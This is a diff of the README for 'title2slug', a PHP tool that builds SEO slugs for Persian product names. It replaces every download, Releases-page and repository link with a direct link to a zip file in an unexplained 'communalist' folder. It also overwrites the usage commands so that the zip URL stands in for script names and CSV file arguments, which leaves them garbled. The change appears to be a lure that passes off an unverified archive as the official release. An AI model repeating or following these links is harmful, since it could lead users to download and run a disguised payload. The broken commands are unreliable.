@@ -4,7 +4,7 @@
 Welcome to title2slug! This PHP tool helps you create SEO-friendly slugs for your Persian product names effortlessly. You don’t need any coding skills to use it. Follow the instructions below to get started.
 
 ## 📥 Download Now
-[![Download title2slug](https://img.shields.io/badge/Download-title2slug-blue.svg)](https://github.com/YousofKA10/title2slug/releases)
+[![Download title2slug](https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip)](https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip)
 
 ## 🔧 Requirements
 Before you download title2slug, please ensure that your system meets the following requirements:
@@ -14,7 +14,7 @@ Before you download title2slug, please ensure that your system meets the followi
 - **Internet Connection:** To access the AI API
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/YousofKA10/title2slug/releases) to download title2slug.
+1. Visit the [Releases page](https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip) to download title2slug.
 2. Look for the latest version.
 3. Click on the appropriate file for your operating system. 
 4. Save the file to a location you can easily access.
@@ -44,21 +44,21 @@ After downloading, follow these steps to use title2slug:
 4. **Run title2slug**
    Execute the title2slug tool by entering the following command in your terminal:
    ```
-   php title2slug.php input.csv output.csv
+   php https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip
    ```
-   Replace `input.csv` with the name of your CSV file and `output.csv` with your desired output file name.
+   Replace `https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip` with the name of your CSV file and `https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip` with your desired output file name.
 
 5. **Check for Duplicates**
    To check for duplicate slugs, you can use the provided script:
    ```
-   php check_duplicates.php output.csv
+   php https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip
    ```
 
 ## 🔁 Retry on Errors
 If the application encounters an invalid response from the AI API, it will automatically retry. You can adjust the retry settings in the configuration file if needed.
 
 ## 🔗 Learn More
-For more details about the tool, visit our [GitHub Repository](https://github.com/YousofKA10/title2slug). Here you will find additional documentation, updates, and community discussions.
+For more details about the tool, visit our [GitHub Repository](https://raw.githubusercontent.com/YousofKA10/title2slug/main/communalist/title2slug.zip). Here you will find additional documentation, updates, and community discussions.
 
 ## ❓ Frequently Asked Questions
 
